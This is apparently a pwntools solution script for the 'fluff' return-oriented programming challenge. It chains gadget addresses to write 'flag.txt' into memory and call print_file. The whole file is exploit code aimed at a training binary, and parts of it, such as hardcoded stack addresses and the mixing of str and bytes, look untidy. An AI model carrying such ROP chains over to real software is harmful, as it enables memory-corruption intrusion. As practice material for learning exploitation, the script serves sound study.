from pwn import *

#pr = process("./fluff")

zero_al_pop_rbp = p64(0x400610)
xlat = p64(0x400628) 
stos = p64(0x400639)
print_file = p64(0x400620)
addr = 0x00601028
pop_rdi = p64(0x4006a3)
ret = p64(0x400295)
bextr = p64(0x40062a)
bextr_no_rdx = p64(0x40062b)
pop_rsp_13_14_15 = p64(0x40069d)
rsp_for_ret = p64(0x7fffffffe1a0-24)
#Get us into rop territory
payload = b"flag.txt\x00\x00\x00\x00AAAA" +pop_rdi +p64(addr) + print_file
# pop address of data into rdi 
payload += pop_rdi + p64(addr)
payload += zero_al_pop_rbp + b"BBBBBBBB"
payload += bextr + p64(0x3000) + p64(0x7fffffffa29e) 
payload += xlat 
payload += stos

for i in range(1,9):
    # zero out al
    payload += zero_al_pop_rbp + b"BBBBBBBB"
    # put &data in rbx 
    payload += bextr_no_rdx + p64(0x7fffffffa29e+i) 
    #grab byte from stack
    payload += xlat 
    #put byte into memory
    payload += stos

payload+= pop_rsp_13_14_15 + rsp_for_ret + "A"*24


print(payload)